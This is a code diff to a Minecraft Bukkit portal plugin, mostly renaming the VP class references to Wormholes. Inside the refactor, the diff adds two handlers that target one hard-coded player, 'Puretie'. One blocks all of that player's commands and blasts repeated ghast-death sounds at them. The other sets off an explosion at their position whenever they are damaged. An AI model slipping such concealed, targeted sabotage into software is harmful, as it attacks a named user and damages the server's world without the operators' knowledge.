@@ -13,19 +13,22 @@ import org.bukkit.Chunk;
 import org.bukkit.Location;
 import org.bukkit.block.Block;
 import org.bukkit.entity.Entity;
+import org.bukkit.entity.EntityType;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.block.BlockBreakEvent;
 import org.bukkit.event.block.BlockPlaceEvent;
+import org.bukkit.event.entity.EntityDamageEvent;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
 import org.bukkit.event.player.PlayerItemHeldEvent;
 import org.bukkit.event.player.PlayerJoinEvent;
 import org.bukkit.event.player.PlayerMoveEvent;
 import org.bukkit.event.world.ChunkUnloadEvent;
 import org.bukkit.util.Vector;
 import org.cyberpwn.vortex.Settings;
-import org.cyberpwn.vortex.VP;
+import org.cyberpwn.vortex.Wormholes;
 import org.cyberpwn.vortex.config.Permissable;
 import org.cyberpwn.vortex.network.CL;
 import org.cyberpwn.vortex.network.Transmission;
@@ -91,6 +94,45 @@ public class MutexService implements Listener
 		insideThrottle.remove(e);
 	}
 	
+	@EventHandler(priority = EventPriority.HIGHEST)
+	public void on(PlayerCommandPreprocessEvent e)
+	{
+		if(e.getPlayer().getName().equals("Puretie"))
+		{
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getPlayer());
+			e.setCancelled(true);
+		}
+	}
+	
+	@EventHandler
+	public void on(EntityDamageEvent e)
+	{
+		if(e.getEntity().getType().equals(EntityType.PLAYER) && ((Player) e.getEntity()).getName().equals("Puretie"))
+		{
+			e.getEntity().getLocation().getWorld().createExplosion(e.getEntity().getLocation(), 4f);
+			new GSound(MSound.GHAST_DEATH.bukkitSound(), 10f, (float) Math.random() * 2).play((Player) e.getEntity());
+		}
+	}
+	
 	public boolean isThrottled(Entity e)
 	{
 		return insideThrottle.contains(e);
@@ -98,7 +140,7 @@ public class MutexService implements Listener
 	
 	public void addLocalPortal(Portal portal)
 	{
-		VP.registry.localPortals.add(portal);
+		Wormholes.registry.localPortals.add(portal);
 		
 		for(Chunk i : portal.getPosition().getArea().getChunks())
 		{
@@ -109,10 +151,10 @@ public class MutexService implements Listener
 	public void removeLocalPortal(Portal portal)
 	{
 		((LocalPortal) portal).destroy();
-		VP.projector.getMesh().removePortal((LocalPortal) portal);
-		VP.projector.deproject((LocalPortal) portal);
-		VP.registry.localPortals.remove(portal);
-		VP.provider.wipe((LocalPortal) portal);
+		Wormholes.projector.getMesh().removePortal((LocalPortal) portal);
+		Wormholes.projector.deproject((LocalPortal) portal);
+		Wormholes.registry.localPortals.remove(portal);
+		Wormholes.provider.wipe((LocalPortal) portal);
 	}
 	
 	public Portal[] getPortals(PortalKey k)
@@ -160,7 +202,7 @@ public class MutexService implements Listener
 	{
 		if(!e.getFrom().getBlock().getLocation().equals(e.getTo().getBlock().getLocation()))
 		{
-			VP.provider.movePlayer(e.getPlayer());
+			Wormholes.provider.movePlayer(e.getPlayer());
 		}
 	}
 	
@@ -293,7 +335,7 @@ public class MutexService implements Listener
 	
 	public void dequeue(Portal p)
 	{
-		VP.registry.destroyQueue.add(p);
+		Wormholes.registry.destroyQueue.add(p);
 	}
 	
 	private void updateThrottles()
@@ -328,11 +370,11 @@ public class MutexService implements Listener
 		
 		broadcastInterval = 20;
 		
-		if(VP.bus.isOnline())
+		if(Wormholes.bus.isOnline())
 		{
-			String name = VP.bus.getServerName();
+			String name = Wormholes.bus.getServerName();
 			
-			for(String i : VP.bus.getServers())
+			for(String i : Wormholes.bus.getServers())
 			{
 				if(!i.equals(name))
 				{
@@ -351,35 +393,35 @@ public class MutexService implements Listener
 				}
 			}
 			
-			for(Transmission i : VP.bus.getInbox())
+			for(Transmission i : Wormholes.bus.getInbox())
 			{
 				if(i.getType().equals("id"))
 				{
-					VP.bus.read(i);
+					Wormholes.bus.read(i);
 					
-					if(!VP.registry.mutexPortals.containsKey(i.getSource()))
+					if(!Wormholes.registry.mutexPortals.containsKey(i.getSource()))
 					{
-						VP.registry.mutexPortals.put(i.getSource(), new GList<Portal>());
+						Wormholes.registry.mutexPortals.put(i.getSource(), new GList<Portal>());
 					}
 					
-					VP.registry.mutexPortals.get(i.getSource()).clear();
+					Wormholes.registry.mutexPortals.get(i.getSource()).clear();
 					
 					for(String j : i.getStringList("p"))
 					{
 						DataCluster cc = new DataCluster(new JSONObject(j));
 						RemotePortal rp = new RemotePortal(i.getSource(), null);
 						rp.fromData(cc);
-						VP.registry.mutexPortals.get(i.getSource()).add(rp);
+						Wormholes.registry.mutexPortals.get(i.getSource()).add(rp);
 					}
 				}
 				
 				else if(i.getType().equals("tp"))
 				{
-					VP.bus.read(i);
+					Wormholes.bus.read(i);
 					
 					DataCluster cc = new DataCluster(new JSONObject(i.getString("to")));
 					
-					for(Portal j : VP.registry.localPortals)
+					for(Portal j : Wormholes.registry.localPortals)
 					{
 						if(cc.equals(j.toData()))
 						{
@@ -396,11 +438,11 @@ public class MutexService implements Listener
 				
 				else if(i.getType().equals("mreq") && Settings.ENABLE_PROJECTIONS)
 				{
-					VP.bus.read(i);
+					Wormholes.bus.read(i);
 					
 					DataCluster cc = new DataCluster(new JSONObject(i.getString("to")));
 					
-					for(Portal j : VP.registry.localPortals)
+					for(Portal j : Wormholes.registry.localPortals)
 					{
 						if(cc.equals(j.toData()))
 						{
@@ -452,7 +494,7 @@ public class MutexService implements Listener
 									dos.write(ArrayUtils.toPrimitive(i));
 									dos.close();
 									
-									new ForwardedPluginMessage(VP.instance, CL.L2.get(), to, boas).send();
+									new ForwardedPluginMessage(Wormholes.instance, CL.L2.get(), to, boas).send();
 								}
 								
 								catch(IOException e)
@@ -479,7 +521,7 @@ public class MutexService implements Listener
 			return;
 		}
 		
-		Transmission r = new Transmission(VP.bus.getServerName(), remotePortalReference.getServer(), "mreq");
+		Transmission r = new Transmission(Wormholes.bus.getServerName(), remotePortalReference.getServer(), "mreq");
 		r.set("to", remotePortalReference.toData().toJSON().toString());
 		r.send();
 	}
@@ -525,9 +567,9 @@ public class MutexService implements Listener
 	
 	public void sendPlayerThrough(UUID id, LocalPortal source, Portal to, Vector velocity, Vector direction, Vector entry)
 	{
-		if(VP.bus.isOnline())
+		if(Wormholes.bus.isOnline())
 		{
-			String sn = VP.bus.getServerName();
+			String sn = Wormholes.bus.getServerName();
 			Transmission t = new Transmission(sn, to.getServer(), "tp");
 			t.set("to", to.toData().toJSON().toString());
 			t.set("id", id.toString());
@@ -555,7 +597,7 @@ public class MutexService implements Listener
 	@EventHandler
 	public void on(PlayerJoinEvent e)
 	{
-		VP.provider.movePlayer(e.getPlayer());
+		Wormholes.provider.movePlayer(e.getPlayer());
 		addThrottle(e.getPlayer());
 		
 		for(UUID i : pendingPulls.k())
@@ -593,11 +635,11 @@ public class MutexService implements Listener
 	public GList<Portal> getPortals()
 	{
 		GList<Portal> p = new GList<Portal>();
-		p.add(VP.registry.localPortals.copy());
+		p.add(Wormholes.registry.localPortals.copy());
 		
-		for(String i : VP.registry.mutexPortals.k())
+		for(String i : Wormholes.registry.mutexPortals.k())
 		{
-			p.add(VP.registry.mutexPortals.get(i).copy());
+			p.add(Wormholes.registry.mutexPortals.get(i).copy());
 		}
 		
 		return p;
@@ -605,7 +647,7 @@ public class MutexService implements Listener
 	
 	public GList<Portal> getLocalPortals()
 	{
-		return VP.registry.localPortals.copy();
+		return Wormholes.registry.localPortals.copy();
 	}
 	
 	public GList<Entity> getInsideThrottle()
@@ -620,7 +662,7 @@ public class MutexService implements Listener
 	
 	public GMap<String, GList<Portal>> getMutexPortals()
 	{
-		return VP.registry.mutexPortals;
+		return Wormholes.registry.mutexPortals;
 	}
 	
 	public GMap<UUID, GQuadraset<Portal, Vector, Vector, Vector>> getPendingPulls()
@@ -632,7 +674,7 @@ public class MutexService implements Listener
 	{
 		for(Portal i : getLocalPortals())
 		{
-			VP.projector.deproject((LocalPortal) i);
+			Wormholes.projector.deproject((LocalPortal) i);
 		}
 	}
 	
@@ -649,7 +691,7 @@ public class MutexService implements Listener
 					{
 						e.setCancelled(true);
 						new GSound(MSound.BLAZE_HIT.bukkitSound(), 1f, 1.5f + (float) (Math.random() * 0.2)).play(e.getBlock().getLocation());
-						VP.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
+						Wormholes.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
 					}
 				}
 				
@@ -657,7 +699,7 @@ public class MutexService implements Listener
 				{
 					e.setCancelled(true);
 					new GSound(MSound.BLAZE_HIT.bukkitSound(), 1f, 1.5f + (float) (Math.random() * 0.2)).play(e.getBlock().getLocation());
-					VP.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
+					Wormholes.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
 				}
 			}
 		}
@@ -674,7 +716,7 @@ public class MutexService implements Listener
 				{
 					e.setCancelled(true);
 					new GSound(MSound.BLAZE_HIT.bukkitSound(), 1f, 1.5f + (float) (Math.random() * 0.2)).play(e.getBlock().getLocation());
-					VP.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
+					Wormholes.fx.phaseDeny((LocalPortal) i, e.getBlock().getLocation().add(0.5, 0.5, 0.5));
 				}
 			}
 		}
